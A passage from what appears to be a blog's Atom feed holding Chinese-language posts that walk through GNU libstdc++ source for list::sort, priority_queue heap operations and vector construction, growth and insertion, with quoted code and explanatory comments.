__tmp[64];</span><br><span class="line">    list * __fill = &amp;__tmp[0];</span><br><span class="line">    list * __counter;</span><br><span class="line"></span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">        //splice中主要调用的是transfer函数</span><br><span class="line">        __carry.splice(__carry.begin(), *this, begin());</span><br><span class="line"></span><br><span class="line">        for(__counter = &amp;__tmp[0];</span><br><span class="line">        __counter != __fill &amp;&amp; !__counter-&gt;empty();</span><br><span class="line">        ++__counter)</span><br><span class="line">            &#123;</span><br><span class="line">        __counter-&gt;merge(__carry);</span><br><span class="line">        __carry.swap(*__counter);</span><br><span class="line">            &#125;</span><br><span class="line">        __carry.swap(*__counter);</span><br><span class="line">        if (__counter == __fill)</span><br><span class="line">            ++__fill;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( !empty() );</span><br><span class="line"></span><br><span class="line">    for (__counter = &amp;__tmp[1]; __counter != __fill; ++__counter)</span><br><span class="line">        __counter-&gt;merge(*(__counter - 1));</span><br><span class="line">    swap( *(__fill - 1) );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;list&quot;&gt;&lt;a href=&quot;#list&quot; class=&quot;headerlink&quot; title=&quot;list&quot;&gt;&lt;/a&gt;list&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;list调试的时候比较奇怪，许多关于链表操作的函数无法跟进到源代码，原因暂时未知。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;
      
    
    </summary>
    
      <category term="STL" scheme="http://siriuswhiter.tk/categories/stl/"/>
    
    
      <category term="c++" scheme="http://siriuswhiter.tk/tags/c/"/>
    
      <category term="STL" scheme="http://siriuswhiter.tk/tags/stl/"/>
    
  </entry>
  
  <entry>
    <title>c++ STL 源码分析(二)</title>
    <link href="http://siriuswhiter.tk/2020/03/16/c-stl-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E4%BA%8C/"/>
    <id>http://siriuswhiter.tk/2020/03/16/c-stl-源码分析-二/</id>
    <published>2020-03-16T03:55:55.000Z</published>
    <updated>2020-03-16T06:51:43.544Z</updated>
    
    <content type="html"><![CDATA[<h1 id="priority-queue"><a href="#priority-queue" class="headerlink" title="priority_queue"></a>priority_queue</h1><p>因为底层比较简单（置于vector的最大堆/最小堆），所以放到前面来分析<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">template&lt;typename _Tp, typename _Sequence = vector&lt;_Tp&gt;,</span><br><span class="line">    typename _Compare  = less&lt;typename _Sequence::value_type&gt; &gt;</span><br><span class="line">class priority_queue</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    protected:</span><br><span class="line">      _Sequence  c;  //底层容器</span><br><span class="line">      _Compare   comp; //元素大小标准</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Constructors"><a href="#Constructors" class="headerlink" title="Constructors"></a>Constructors</h2><p>指定初值。such as:int a[4] = {1,2,3,4}; priority_queue<int> q(a,a+4);</int></p><p>首先是vector的初始化，将初值先放入了vector中。</p><p>之后进入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    template&lt;typename _InputIterator&gt;</span><br><span class="line">    priority_queue(_InputIterator __first, _InputIterator __last,</span><br><span class="line">            const _Compare&amp; __x = _Compare(),</span><br><span class="line">            _Sequence&amp;&amp; __s = _Sequence())</span><br><span class="line">: c(std::move(__s)), comp(__x)</span><br><span class="line">    &#123;</span><br><span class="line">    __glibcxx_requires_valid_range(__first, __last);</span><br><span class="line">    c.insert(c.end(), __first, __last);</span><br><span class="line">    std::make_heap(c.begin(), c.end(), comp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>初始化底层容器c，并将之前存入vector的初值插入c，之后调用make_heap创建堆。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">template&lt;typename _RandomAccessIterator, typename _Compare&gt;</span><br><span class="line">void</span><br><span class="line">__make_heap(_RandomAccessIterator __first, _RandomAccessIterator __last,</span><br><span class="line">    _Compare __comp)</span><br><span class="line">&#123;</span><br><span class="line">    typedef typename iterator_traits&lt;_RandomAccessIterator&gt;::value_type</span><br><span class="line">    _ValueType;</span><br><span class="line">    typedef typename iterator_traits&lt;_RandomAccessIterator&gt;::difference_type</span><br><span class="line">    _DistanceType;</span><br><span class="line"></span><br><span class="line">    if (__last - __first &lt; 2)</span><br><span class="line">        return;</span><br><span class="line"></span><br><span class="line">    const _DistanceType __len = __last - __first;</span><br><span class="line">    _DistanceType __parent = (__len - 2) / 2;  //最后一个子节点的父节点</span><br><span class="line">    while (true)</span><br><span class="line">&#123;</span><br><span class="line">    _ValueType __value = _GLIBCXX_MOVE(*(__first + __parent));</span><br><span class="line">    std::__adjust_heap(__first, __parent, __len, _GLIBCXX_MOVE(__value),</span><br><span class="line">                __comp);</span><br><span class="line">    if (__parent == 0)</span><br><span class="line">    return;</span><br><span class="line">    __parent--;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从最后一个子树的父节点开始调用__adjust_heap将子树调整为最大堆（最小堆）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">template&lt;typename _RandomAccessIterator, typename _Distance,</span><br><span class="line">    typename _Tp, typename _Compare&gt;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">args:基准指针为__first，洞号为__holeIndex，长度为__len，洞号处的值调整为__value，大小比较为__comp</span><br><span class="line">这样写的好处是可以直接复用，正常使用时，设置__value = *(__first + __holeIndex)即可</span><br><span class="line">当需要弹出顶端元素时，设置__value = *(__first + __last -1)即可</span><br><span class="line">*/</span><br><span class="line">void</span><br><span class="line">__adjust_heap(_RandomAccessIterator __first, _Distance __holeIndex,</span><br><span class="line">        _Distance __len, _Tp __value, _Compare __comp)</span><br><span class="line">&#123;</span><br><span class="line">    const _Distance __topIndex = __holeIndex;</span><br><span class="line">    _Distance __secondChild = __holeIndex;</span><br><span class="line">    while (__secondChild &lt; (__len - 1) / 2)          //偶数个节点</span><br><span class="line">&#123;</span><br><span class="line">    __secondChild = 2 * (__secondChild + 1);</span><br><span class="line">    if (__comp(__first + __secondChild,</span><br><span class="line">            __first + (__secondChild - 1)))</span><br><span class="line">    __secondChild--;                                  //secondChild指向两个中较大的</span><br><span class="line">    *(__first + __holeIndex) = _GLIBCXX_MOVE(*(__first + __secondChild));</span><br><span class="line">    __holeIndex = __secondChild;</span><br><span class="line">&#125;</span><br><span class="line">    if ((__len &amp; 1) == 0 &amp;&amp; __secondChild == (__len - 2) / 2) //奇数个节点</span><br><span class="line">&#123;</span><br><span class="line">    __secondChild = 2 * (__secondChild + 1);</span><br><span class="line">    *(__first + __holeIndex) = _GLIBCXX_MOVE(*(__first</span><br><span class="line">                            + (__secondChild - 1)));</span><br><span class="line">    __holeIndex = __secondChild - 1;</span><br><span class="line">&#125;</span><br><span class="line">    std::__push_heap(__first, __holeIndex, __topIndex, </span><br><span class="line">            _GLIBCXX_MOVE(__value),</span><br><span class="line">            __gnu_cxx::__ops::__iter_comp_val(__comp));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">template&lt;typename _RandomAccessIterator, typename _Distance, typename _Tp,</span><br><span class="line">    typename _Compare&gt;</span><br><span class="line">void</span><br><span class="line">__push_heap(_RandomAccessIterator __first,</span><br><span class="line">    _Distance __holeIndex, _Distance __topIndex, _Tp __value,</span><br><span class="line">    _Compare __comp)</span><br><span class="line">&#123;</span><br><span class="line">    _Distance __parent = (__holeIndex - 1) / 2;     //当前__holeIndex的父节点</span><br><span class="line">    </span><br><span class="line">    //当尚未到达顶端且父节点小于__value</span><br><span class="line">    while (__holeIndex &gt; __topIndex &amp;&amp; __comp(__first + __parent, __value))</span><br><span class="line">&#123;</span><br><span class="line">    *(__first + __holeIndex) = _GLIBCXX_MOVE(*(__first + __parent));</span><br><span class="line">    __holeIndex = __parent;</span><br><span class="line">    __parent = (__holeIndex - 1) / 2;</span><br><span class="line">&#125;</span><br><span class="line">    *(__first + __holeIndex) = _GLIBCXX_MOVE(__value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="push-amp-amp-pop"><a href="#push-amp-amp-pop" class="headerlink" title="push &amp;&amp; pop"></a>push &amp;&amp; pop</h2><ol><li>push就是先将元素推入底层vector末端，之后调用push_heap重排<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">push(value_type&amp;&amp; __x)</span><br><span class="line">&#123;</span><br><span class="line">c.push_back(std::move(__x));</span><br><span class="line">std::push_heap(c.begin(), c.end(), comp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">template&lt;typename _RandomAccessIterator, typename _Compare&gt;</span><br><span class="line">inline void</span><br><span class="line">push_heap(_RandomAccessIterator __first, _RandomAccessIterator __last,</span><br><span class="line">        _Compare __comp)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    _ValueType __value = _GLIBCXX_MOVE(*(__last - 1));</span><br><span class="line">    std::__push_heap(__first, _DistanceType((__last - __first) - 1),</span><br><span class="line">            _DistanceType(0), _GLIBCXX_MOVE(__value),</span><br><span class="line">            __gnu_cxx::__ops::__iter_comp_val(__comp));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>pop也是调用pop_heap进行重排，再以底层的vector的pop_back将其弹出<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">pop()</span><br><span class="line">&#123;</span><br><span class="line">__glibcxx_requires_nonempty();</span><br><span class="line">std::pop_heap(c.begin(), c.end(), comp);</span><br><span class="line">c.pop_back();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>可以看到<strong>pop_heap是将最后一个元素的值存入</strong>value中，将第一位设置为__holeIndex之后对前len-1位进行堆排序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">template&lt;typename _RandomAccessIterator, typename _Compare&gt;</span><br><span class="line">inline void</span><br><span class="line">__pop_heap(_RandomAccessIterator __first, _RandomAccessIterator __last,</span><br><span class="line">        _RandomAccessIterator __result, _Compare __comp)</span><br><span class="line">&#123;</span><br><span class="line">    typedef typename iterator_traits&lt;_RandomAccessIterator&gt;::value_type</span><br><span class="line">_ValueType;</span><br><span class="line">    typedef typename iterator_traits&lt;_RandomAccessIterator&gt;::difference_type</span><br><span class="line">_DistanceType;</span><br><span class="line"></span><br><span class="line">    _ValueType __value = _GLIBCXX_MOVE(*__result);</span><br><span class="line">    *__result = _GLIBCXX_MOVE(*__first);</span><br><span class="line">    std::__adjust_heap(__first, _DistanceType(0),</span><br><span class="line">            _DistanceType(__last - __first),</span><br><span class="line">            _GLIBCXX_MOVE(__value), __comp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;priority-queue&quot;&gt;&lt;a href=&quot;#priority-queue&quot; class=&quot;headerlink&quot; title=&quot;priority_queue&quot;&gt;&lt;/a&gt;priority_queue&lt;/h1&gt;&lt;p&gt;因为底层比较简单（置于vector的最大堆/
      
    
    </summary>
    
      <category term="STL" scheme="http://siriuswhiter.tk/categories/stl/"/>
    
    
      <category term="c++" scheme="http://siriuswhiter.tk/tags/c/"/>
    
      <category term="STL" scheme="http://siriuswhiter.tk/tags/stl/"/>
    
  </entry>
  
  <entry>
    <title>c++ STL 源码分析(一)</title>
    <link href="http://siriuswhiter.tk/2020/03/13/c-stl-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E4%B8%80/"/>
    <id>http://siriuswhiter.tk/2020/03/13/c-stl-源码分析-一/</id>
    <published>2020-03-13T07:49:30.000Z</published>
    <updated>2020-03-16T06:58:51.021Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h1><p>主要代码位于 stl_vector.h<br>较为简单，本身就是个动态数组。结构较为简单<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">template&lt;typename _Tp, typename _Alloc&gt;</span><br><span class="line">struct _Vector_base</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    struct _Vector_impl : public _Tp_alloc_type</span><br><span class="line">    &#123;</span><br><span class="line">pointer _M_start;</span><br><span class="line">pointer _M_finish;</span><br><span class="line">pointer _M_end_of_storage;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>因为是连续地址空间，所以迭代器直接就是正常的指针，分别表示目前使用的头，尾与可用的尾指针。为了降低空间配置的成本，vector配置的空间一般会大于所需的空间，实际上就是在分配大于当前容量时，会分配当前容量二倍的空间，这个可以通过代码来试一下，后面也会调试源码来看到。</p><h2 id="Constructors"><a href="#Constructors" class="headerlink" title="Constructors"></a>Constructors</h2><ol><li>指定空间大小及初值。such as: vector<int> v(3,0); <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vector(size_type __n, const value_type&amp; __value,</span><br><span class="line">    const allocator_type&amp; __a = allocator_type())</span><br><span class="line">: _Base(__n, __a)</span><br><span class="line">&#123; _M_fill_initialize(__n, __value); &#125;</span><br></pre></td></tr></table></figure></int></li></ol><p>_Base(<strong>n,</strong>a) 会分配空间并设置好迭代器的位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_Vector_base(size_t __n, const allocator_type&amp; __a)</span><br><span class="line">: _M_impl(__a)</span><br><span class="line">&#123; _M_create_storage(__n); &#125;</span><br></pre></td></tr></table></figure></p><p>_M_fill_initialize(<strong>n, </strong>value) 会将初值填充进去并调整迭代器位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">_M_fill_initialize(size_type __n, const value_type&amp; __value)</span><br><span class="line">&#123;</span><br><span class="line">std::__uninitialized_fill_n_a(this-&gt;_M_impl._M_start, __n, __value, </span><br><span class="line">                _M_get_Tp_allocator());</span><br><span class="line">this-&gt;_M_impl._M_finish = this-&gt;_M_impl._M_end_of_storage;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ol start="2"><li>当有初值进行初始化时。such as: vector<int> v = {1，2};<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vector(initializer_list&lt;value_type&gt; __l,</span><br><span class="line">    const allocator_type&amp; __a = allocator_type())</span><br><span class="line">: _Base(__a)</span><br><span class="line">&#123;</span><br><span class="line">_M_range_initialize(__l.begin(), __l.end(),</span><br><span class="line">        random_access_iterator_tag());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></int></li></ol><p>将初值复制进分配的空间中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">template&lt;typename _ForwardIterator&gt;</span><br><span class="line">void</span><br><span class="line">_M_range_initialize(_ForwardIterator __first,</span><br><span class="line">        _ForwardIterator __last, std::forward_iterator_tag)</span><br><span class="line">&#123;</span><br><span class="line">    const size_type __n = std::distance(__first, __last);</span><br><span class="line">    this-&gt;_M_impl._M_start = this-&gt;_M_allocate(__n);</span><br><span class="line">    this-&gt;_M_impl._M_end_of_storage = this-&gt;_M_impl._M_start + __n;</span><br><span class="line">    this-&gt;_M_impl._M_finish =</span><br><span class="line">    std::__uninitialized_copy_a(__first, __last,</span><br><span class="line">                this-&gt;_M_impl._M_start,</span><br><span class="line">                _M_get_Tp_allocator());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="push-back-amp-amp-pop-back"><a href="#push-back-amp-amp-pop-back" class="headerlink" title="push_back &amp;&amp; pop_back"></a>push_back &amp;&amp; pop_back</h2><ol><li>push_back<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">push_back(value_type&amp;&amp; __x)</span><br><span class="line">&#123; emplace_back(std::move(__x)); &#125;</span><br></pre></td></tr></table></figure></li></ol><p>进入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">template&lt;typename _Tp, typename _Alloc&gt;</span><br><span class="line">template&lt;typename... _Args&gt;</span><br><span class="line">    void</span><br><span class="line">    vector&lt;_Tp, _Alloc&gt;::</span><br><span class="line">    emplace_back(_Args&amp;&amp;... __args)</span><br><span class="line">    &#123;</span><br><span class="line">if (this-&gt;_M_impl._M_finish != this-&gt;_M_impl._M_end_of_storage)</span><br><span class="line">    &#123;</span><br><span class="line">    _Alloc_traits::construct(this-&gt;_M_impl, this-&gt;_M_impl._M_finish,</span><br><span class="line">                    std::forward&lt;_Args&gt;(__args)...);</span><br><span class="line">    ++this-&gt;_M_impl._M_finish;</span><br><span class="line">    &#125;</span><br><span class="line">else</span><br><span class="line">    _M_emplace_back_aux(std::forward&lt;_Args&gt;(__args)...);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>就是检测下是否到达容量。如果还有剩余，则调用construct将元素置入并将尾迭代器向后，否则调用_M_emplace_back_aux<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">template&lt;typename _Tp, typename _Alloc&gt;</span><br><span class="line">template&lt;typename... _Args&gt;</span><br><span class="line">    void</span><br><span class="line">    vector&lt;_Tp, _Alloc&gt;::</span><br><span class="line">    _M_emplace_back_aux(_Args&amp;&amp;... __args)</span><br><span class="line">    &#123;</span><br><span class="line">const size_type __len =</span><br><span class="line">    _M_check_len(size_type(1), &quot;vector::_M_emplace_back_aux&quot;); //计算新空间所需大小</span><br><span class="line"></span><br><span class="line">//暂时使用的指向新vector的迭代器</span><br><span class="line">pointer __new_start(this-&gt;_M_allocate(__len));</span><br><span class="line">pointer __new_finish(__new_start);</span><br><span class="line">__try</span><br><span class="line">    &#123;</span><br><span class="line">    //将原vector的内容拷贝到新的vector</span><br><span class="line">    _Alloc_traits::construct(this-&gt;_M_impl, __new_start + size(),</span><br><span class="line">                    std::forward&lt;_Args&gt;(__args)...);</span><br><span class="line">    __new_finish = 0;</span><br><span class="line"></span><br><span class="line">    __new_finish</span><br><span class="line">        = std::__uninitialized_move_if_noexcept_a</span><br><span class="line">        (this-&gt;_M_impl._M_start, this-&gt;_M_impl._M_finish,</span><br><span class="line">        __new_start, _M_get_Tp_allocator());</span><br><span class="line"></span><br><span class="line">    ++__new_finish;</span><br><span class="line">    &#125;</span><br><span class="line">__catch(...)</span><br><span class="line">    &#123;</span><br><span class="line">    if (!__new_finish)</span><br><span class="line">        _Alloc_traits::destroy(this-&gt;_M_impl, __new_start + size());</span><br><span class="line">    else</span><br><span class="line">        std::_Destroy(__new_start, __new_finish, _M_get_Tp_allocator());</span><br><span class="line">    _M_deallocate(__new_start, __len);</span><br><span class="line">    __throw_exception_again;</span><br><span class="line">    &#125;</span><br><span class="line">//释放原vector</span><br><span class="line">std::_Destroy(this-&gt;_M_impl._M_start, this-&gt;_M_impl._M_finish,</span><br><span class="line">            _M_get_Tp_allocator());</span><br><span class="line">_M_deallocate(this-&gt;_M_impl._M_start,</span><br><span class="line">            this-&gt;_M_impl._M_end_of_storage</span><br><span class="line">            - this-&gt;_M_impl._M_start);</span><br><span class="line">//更新迭代器</span><br><span class="line">this-&gt;_M_impl._M_start = __new_start;</span><br><span class="line">this-&gt;_M_impl._M_finish = __new_finish;</span><br><span class="line">this-&gt;_M_impl._M_end_of_storage = __new_start + __len;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><ul><li>这里学习到的一点是： vector 迭代器的更新（空间重配置，迭代器便需要更新）。</li></ul><ol start="2"><li>pop_back</li></ol><p>就是单纯的移动迭代器指针之后撤销元素<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">pop_back() _GLIBCXX_NOEXCEPT</span><br><span class="line">&#123;</span><br><span class="line">--this-&gt;_M_impl._M_finish;</span><br><span class="line">_Alloc_traits::destroy(this-&gt;_M_impl, this-&gt;_M_impl._M_finish);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h2><p>接口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iterator</span><br><span class="line">insert(const_iterator __position, value_type&amp;&amp; __x)</span><br><span class="line">&#123; return emplace(__position, std::move(__x)); &#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">typename vector&lt;_Tp, _Alloc&gt;::iterator</span><br><span class="line">vector&lt;_Tp, _Alloc&gt;::</span><br><span class="line">emplace(const_iterator __position, _Args&amp;&amp;... __args)</span><br><span class="line">&#123;</span><br><span class="line">    //若留有空间且插入为末尾，则直接按push_back中的操作进行</span><br><span class="line">const size_type __n = __position - begin();</span><br><span class="line">if (this-&gt;_M_impl._M_finish != this-&gt;_M_impl._M_end_of_storage</span><br><span class="line">&amp;&amp; __position == end())</span><br><span class="line">&#123;</span><br><span class="line">_Alloc_traits::construct(this-&gt;_M_impl, this-&gt;_M_impl._M_finish,</span><br><span class="line">                std::forward&lt;_Args&gt;(__args)...);</span><br><span class="line">++this-&gt;_M_impl._M_finish;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">_M_insert_aux(begin() + (__position - cbegin()),</span><br><span class="line">    std::forward&lt;_Args&gt;(__args)...);</span><br><span class="line">return iterator(this-&gt;_M_impl._M_start + __n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>否则进入细节的插入函数_M_insert_aux<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">vector&lt;_Tp, _Alloc&gt;::</span><br><span class="line">_M_insert_aux(iterator __position, const _Tp&amp; 